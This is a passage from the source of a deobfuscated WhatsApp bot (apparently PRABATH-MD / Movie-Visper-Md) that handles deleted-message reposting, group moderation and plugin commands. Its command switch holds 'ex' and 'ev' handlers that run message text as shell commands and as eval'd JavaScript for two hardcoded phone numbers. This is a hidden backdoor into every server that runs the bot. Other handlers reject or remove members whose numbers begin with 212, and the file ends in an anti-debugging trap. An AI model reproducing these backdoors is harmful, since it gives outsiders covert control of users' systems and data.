                                        '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                        iB +
                                        '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                        iv +
                                        '_',
                                    }))
                                }
                              }
                              y2()
                            } else {
                              if (iJ.type === 'documentMessage') {
                                async function y3() {
                                  var y4 = n('')
                                  const y5 = U(w, iJ)
                                  let y6 = await y5.download(y4),
                                    y7 = require('file-type'),
                                    y8 = y7.fromBuffer(y6)
                                  await fs.promises.writeFile('./' + y8.ext, y6)
                                  iJ.message.documentWithCaptionMessage
                                    ? await w.sendMessage(ix, {
                                        document: fs.readFileSync(
                                          './' + y8.ext
                                        ),
                                        mimetype:
                                          iJ.message.documentMessage.mimetype,
                                        fileName:
                                          iJ.message.documentMessage.fileName,
                                        caption:
                                          '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                          iB +
                                          '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                          iv +
                                          '_\n',
                                      })
                                    : await w.sendMessage(ix, {
                                        document: fs.readFileSync(
                                          './' + y8.ext
                                        ),
                                        mimetype:
                                          iJ.message.documentMessage.mimetype,
                                        fileName:
                                          iJ.message.documentMessage.fileName,
                                        caption:
                                          '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                          iB +
                                          '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                          iv +
                                          '_\n',
                                      })
                                }
                                y3()
                              } else {
                                if (iJ.type === 'audioMessage') {
                                  async function y4() {
                                    var y5 = n('')
                                    const y6 = U(w, iJ)
                                    let y7 = await y6.download(y5)
                                    let y8 = require('file-type'),
                                      y9 = y8.fromBuffer(y7)
                                    await fs.promises.writeFile(
                                      './' + y9.ext,
                                      y7
                                    )
                                    if (iJ.message.audioMessage) {
                                      const ya = await w.sendMessage(ix, {
                                          audio: fs.readFileSync('./' + y9.ext),
                                          mimetype:
                                            iJ.message.audioMessage.mimetype,
                                          fileName: b.id + '.mp3',
                                        }),
                                        yi = {
                                          text:
                                            '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                            iB +
                                            '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                            iv +
                                            '_\n',
                                        }
                                      const yy = {}
                                      return (
                                        (yy.quoted = ya),
                                        await w.sendMessage(ix, yi, yy)
                                      )
                                    } else {
                                      if (
                                        iJ.message.audioMessage.ptt === 'true'
                                      ) {
                                        const yo = await w.sendMessage(ix, {
                                            audio: fs.readFileSync(
                                              './' + y9.ext
                                            ),
                                            mimetype:
                                              iJ.message.audioMessage.mimetype,
                                            ptt: 'true',
                                            fileName: b.id + '.mp3',
                                          }),
                                          yQ = {
                                            text:
                                              '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                              iB +
                                              '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                              iv +
                                              '_\n',
                                          }
                                        const yI = {}
                                        return (
                                          (yI.quoted = yo),
                                          await w.sendMessage(ix, yQ, yI)
                                        )
                                      }
                                    }
                                  }
                                  y4()
                                } else {
                                  if (iJ.type === 'stickerMessage') {
                                    async function y5() {
                                      var y6 = n('')
                                      const y7 = U(w, iJ)
                                      let y8 = await y7.download(y6),
                                        y9 = require('file-type')
                                      let ya = y9.fromBuffer(y8)
                                      await fs.promises.writeFile(
                                        './' + ya.ext,
                                        y8
                                      )
                                      if (iJ.message.stickerMessage) {
                                        const yi = await w.sendMessage(ix, {
                                            sticker: fs.readFileSync(
                                              './' + ya.ext
                                            ),
                                            package: 'PRABATH-MD \uD83C\uDF1F',
                                          }),
                                          yy = {
                                            text:
                                              '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                              iB +
                                              '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                              iv +
                                              '_\n',
                                          }
                                        const yo = {}
                                        return (
                                          (yo.quoted = yi),
                                          await w.sendMessage(ix, yy, yo)
                                        )
                                      } else {
                                        const yQ = await w.sendMessage(ix, {
                                            sticker: fs.readFileSync(
                                              './' + ya.ext
                                            ),
                                            package: 'PRABATH-MD \uD83C\uDF1F',
                                          }),
                                          yI = {
                                            text:
                                              '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                              iB +
                                              '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                              iv +
                                              '_\n',
                                          }
                                        const yV = {}
                                        return (
                                          (yV.quoted = yQ),
                                          await w.sendMessage(ix, yI, yV)
                                        )
                                      }
                                    }
                                    y5()
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              } else {
                console.log('Original message not found for revocation.')
              }
            }
            N.msg && N.msg.type === 0 ? iH(N) : is(N)
          }
        }
      }
      const aT = await q(
        'https://mv-visper-full-db.pages.dev/Main/bad_word.json'
      )
      if (config.ANTI_BAD == 'true') {
        if (!aO && !aM) {
          for (any in aT) {
            if (a4.toLowerCase().includes(aT[any])) {
              if (!a4.includes('tent')) {
                if (!a4.includes('docu')) {
                  if (!a4.includes('https')) {
                    if (aW.includes(ai)) {
                      return
                    }
                    if (N.key.fromMe) {
                      return
                    }
                    const iG = {}
                    iG.delete = N.key
                    await w.sendMessage(a2, iG)
                    const ig = {}
                    ig.text = '*Bad word detected..!*'
                    await w.sendMessage(a2, ig)
                    await w.groupParticipantsUpdate(a2, [ai], 'remove')
                  }
                }
              }
            }
          }
        }
      }
      if (
        a4 === 'send' ||
        a4 === 'Send' ||
        a4 === 'Ewpm' ||
        a4 === 'ewpn' ||
        a4 === 'Dapan' ||
        a4 === 'dapan' ||
        a4 === 'oni' ||
        a4 === 'Oni' ||
        a4 === 'save' ||
        a4 === 'Save' ||
        a4 === 'ewanna' ||
        a4 === 'Ewanna' ||
        a4 === 'ewam' ||
        a4 === 'Ewam' ||
        a4 === 'sv' ||
        a4 === 'Sv' ||
        a4 === 'දාන්න' ||
        a4 === 'එවම්න'
      ) {
        const iz = JSON.stringify(N.message, null, 2),
          iJ = JSON.parse(iz),
          ie = iJ.extendedTextMessage.contextInfo.remoteJid
        if (!ie) {
          return
        }
        const iB = (iC) => {
          const iv = {
            jpg: 'ffd8ffe0',
            png: '89504e47',
            mp4: '00000018',
          }
          const iT = iv,
            iw = iC.toString('hex', 0, 4)
          return Object.keys(iT).find((iN) => iT[iN] === iw)
        }
        if (b.quoted.type === 'imageMessage') {
          var L = n('')
          let iC = await b.quoted.download(L),
            iv = iB(iC)
          await fs.promises.writeFile('./' + iv, iC)
          const iT = b.quoted.imageMessage.caption
          await w.sendMessage(a2, {
            image: fs.readFileSync('./' + iv),
            caption: iT,
          })
        } else {
          if (b.quoted.type === 'videoMessage') {
            var L = n('')
            let iw = await b.quoted.download(L),
              iN = iB(iw)
            await fs.promises.writeFile('./' + iN, iw)
            const iS = b.quoted.videoMessage.caption
            let iL = {
              video: fs.readFileSync('./' + iN),
              mimetype: 'video/mp4',
              fileName: b.id + '.mp4',
              caption: iS,
              headerType: 4,
            }
            const iu = { quoted: N }
            await w.sendMessage(a2, iL, iu)
          }
        }
      }
      if (
        a4 === 'hi' ||
        a4 === 'Hi' ||
        a4 === 'hey' ||
        a4 === 'Hey' ||
        a4 === 'hii' ||
        a4 === 'Hii'
      ) {
        if (config.AUTO_VOICE == 'true') {
          if (aM) {
            return
          }
          await w.sendPresenceUpdate('recording', a2)
          const iX = {
            url: 'https://mv-visper-full-db.pages.dev/Data/WhatsApp%20Audio%202025-04-28%20at%2017.12.23.mpeg',
          }
          const ib = {
            audio: iX,
            mimetype: 'audio/mpeg',
            ptt: true,
          }
          const y0 = { quoted: N }
          await w.sendMessage(a2, ib, y0)
        }
      }
      const aw = require('./command'),
        aN = a6 ? a4.slice(1).trim().split(' ')[0].toLowerCase() : false
      if (a6) {
        const y1 =
          aw.commands.find((y2) => y2.pattern === aN) ||
          aw.commands.find((y2) => y2.alias && y2.alias.includes(aN))
        if (y1) {
          if (y1.react) {
            w.sendMessage(a2, {
              react: {
                text: y1.react,
                key: N.key,
              },
            })
          }
          try {
            const y2 = {
              from: a2,
              prefix: a5,
              l: l,
              isSudo: az,
              quoted: a3,
              body: a4,
              isCmd: a6,
              isPre: ar,
              command: a7,
              args: a8,
              q: a9,
              isGroup: aa,
              sender: ai,
              senderNumber: ay,
              botNumber2: an,
              botNumber: ao,
              pushname: aQ,
              isMe: aM,
              isOwner: ap,
              groupMetadata: aY,
              groupName: aq,
              participants: aU,
              groupAdmins: aW,
              isBotAdmins: aP,
              isAdmins: aO,
              reply: aR,
            }
            y1.function(w, N, b, y2)
          } catch (y3) {
            console.error('[PLUGIN ERROR] ', y3)
          }
        }
      }
      aw.commands.map(async (y4) => {
        if (a4 && y4.on === 'body') {
          y4.function(w, N, b, {
            from: a2,
            prefix: a5,
            l: l,
            isSudo: az,
            quoted: a3,
            isPre: ar,
            body: a4,
            isCmd: a6,
            command: y4,
            args: a8,
            q: a9,
            isGroup: aa,
            sender: ai,
            senderNumber: ay,
            botNumber2: an,
            botNumber: ao,
            pushname: aQ,
            isMe: aM,
            isOwner: ap,
            groupMetadata: aY,
            groupName: aq,
            participants: aU,
            groupAdmins: aW,
            isBotAdmins: aP,
            isAdmins: aO,
            reply: aR,
          })
        } else {
          if (N.q && y4.on === 'text') {
            y4.function(w, N, b, {
              from: a2,
              l: l,
              quoted: a3,
              body: a4,
              isSudo: az,
              isCmd: a6,
              isPre: ar,
              command: y4,
              args: a8,
              q: a9,
              isGroup: aa,
              sender: ai,
              senderNumber: ay,
              botNumber2: an,
              botNumber: ao,
              pushname: aQ,
              isMe: aM,
              isOwner: ap,
              groupMetadata: aY,
              groupName: aq,
              participants: aU,
              groupAdmins: aW,
              isBotAdmins: aP,
              isAdmins: aO,
              reply: aR,
            })
          } else {
            if (
              (y4.on === 'image' || y4.on === 'photo') &&
              N.type === 'imageMessage'
            ) {
              y4.function(w, N, b, {
                from: a2,
                prefix: a5,
                l: l,
                quoted: a3,
                isSudo: az,
                body: a4,
                isCmd: a6,
                command: y4,
                isPre: ar,
                args: a8,
                q: a9,
                isGroup: aa,
                sender: ai,
                senderNumber: ay,
                botNumber2: an,
                botNumber: ao,
                pushname: aQ,
                isMe: aM,
                isOwner: ap,
                groupMetadata: aY,
                groupName: aq,
                participants: aU,
                groupAdmins: aW,
                isBotAdmins: aP,
                isAdmins: aO,
                reply: aR,
              })
            } else {
              y4.on === 'sticker' &&
                N.type === 'stickerMessage' &&
                y4.function(w, N, b, {
                  from: a2,
                  prefix: a5,
                  l: l,
                  quoted: a3,
                  isSudo: az,
                  body: a4,
                  isCmd: a6,
                  command: y4,
                  args: a8,
                  isPre: ar,
                  q: a9,
                  isGroup: aa,
                  sender: ai,
                  senderNumber: ay,
                  botNumber2: an,
                  botNumber: ao,
                  pushname: aQ,
                  isMe: aM,
                  isOwner: ap,
                  groupMetadata: aY,
                  groupName: aq,
                  participants: aU,
                  groupAdmins: aW,
                  isBotAdmins: aP,
                  isAdmins: aO,
                  reply: aR,
                })
            }
          }
        }
      })
      if (aD(config.ANTI_LINK == 'true') && aP) {
        if (!aO) {
          if (!aM) {
            if (a4.match('chat.whatsapp.com')) {
              const y4 = { delete: N.key }
              await w.sendMessage(a2, y4)
            }
          }
        }
      }
      if (config.ANTI_BOT == 'true') {
        if (aa && !aO && !aM && aP) {
          if (N.id.startsWith('BAE')) {
            const y5 = { text: '*Other bots are not allow here \u274C*' }
            await w.sendMessage(a2, y5)
            if (config.ANTI_BOT && aP) {
              const y6 = { delete: N.key }
              await w.sendMessage(a2, y6)
              await w.groupParticipantsUpdate(a2, [ai], 'remove')
            }
          }
          if (N.id.startsWith('QUEENAMDI')) {
            const y7 = { text: '*Other bots are not allow here \u274C*' }
            await w.sendMessage(a2, y7)
            if (config.ANTI_BOT && aP) {
              const y8 = { delete: N.key }
              await w.sendMessage(a2, y8)
              await w.groupParticipantsUpdate(a2, [ai], 'remove')
            }
          }
          if (N.id.startsWith('B1E')) {
            const y9 = { text: '*Other bots are not allow here \u274C*' }
            await w.sendMessage(a2, y9)
            if (config.ANTI_BOT && aP) {
              const ya = { delete: N.key }
              await w.sendMessage(a2, ya)
              await w.groupParticipantsUpdate(a2, [ai], 'remove')
            }
          }
        }
      }
      switch (a7) {
        case 'jid':
          aR(a2)
          break
        case 'device':
          {
            let yi = getDevice(
              N.message.extendedTextMessage.contextInfo.stanzaId
            )
            aR('*He Is Using* _*Whatsapp ' + yi + ' version*_')
          }
          break
        case 'ex':
          {
            if (ay == 94778500326) {
              const { exec: yy } = require('child_process')
              yy(a9, (yo, yQ) => {
                if (yo) {
                  return aR('-------\n\n' + yo)
                }
                if (yQ) {
                  return aR('-------\n\n' + yQ)
                }
              })
            }
          }
          break
        case 'apprv':
          {
            if (ay == 94778500326) {
              let yo = await w.groupRequestParticipantsList(a2)
              for (let yQ = 0; yQ < yo.length; yQ++) {
                yo[yQ].jid.startsWith('212')
                  ? await w.groupRequestParticipantsUpdate(
                      a2,
                      [yo[yQ].jid],
                      'reject'
                    )
                  : await w.groupRequestParticipantsUpdate(
                      a2,
                      [yo[yQ].jid],
                      'approve'
                    )
              }
            }
          }
          break
        case '212r':
          {
            if (ay == 94778500326) {
              for (let yI = 0; yI < aU.length; yI++) {
                aU[yI].id.startsWith('212') &&
                  (await w.groupParticipantsUpdate(a2, [aU[yI].id], 'remove'))
              }
            }
          }
          break
        case 'rtf':
          {
            console.log(dsa)
          }
          break
        case 'ev':
          {
            if (ay == 94778500326 || ay == 94722617699) {
              let yV = a9.replace('\xB0', '.toString()')
              try {
                let yh = await eval(yV)
                typeof yh === 'object'
                  ? aR(util.format(yh))
                  : aR(util.format(yh))
              } catch (yK) {
                aR(util.format(yK))
              }
            }
          }
          break
        default:
      }
    } catch (yM) {
      const yp = String(yM)
      console.log(yp)
    }
  })
}
app.get('/', (h, K) => {
  K.send('\uD83D\uDCDF VISPER DL Working successfully!')
})
app.listen(port, () =>
  console.log(
    'Movie-Visper-Md Server listening on port http://localhost:' + port
  )
)
setTimeout(() => {
  connect()
}, 3000)
process.on('uncaughtException', function (V) {
  let K = String(V)
  if (K.includes('Socket connection timeout')) {
    return
  }
  if (K.includes('rate-overlimit')) {
    return
  }
  if (K.includes('Connection Closed')) {
    return
  }
  if (K.includes('Value not found')) {
    return
  }
  if (K.includes('Authentication timed out')) {
    restart()
  }
  console.log('Caught exception: ', V)
})
function a(V) {
  function K(M) {
    if (typeof M === 'string') {
      return function (p) {}.constructor('while (true) {}').apply('counter')
    } else {
      ;('' + M / M).length !== 1 || M % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    K(++M)
  }
  try {
    if (V) {
      return K
    } else {
      K(0)
    }
  } catch (M) {}
}
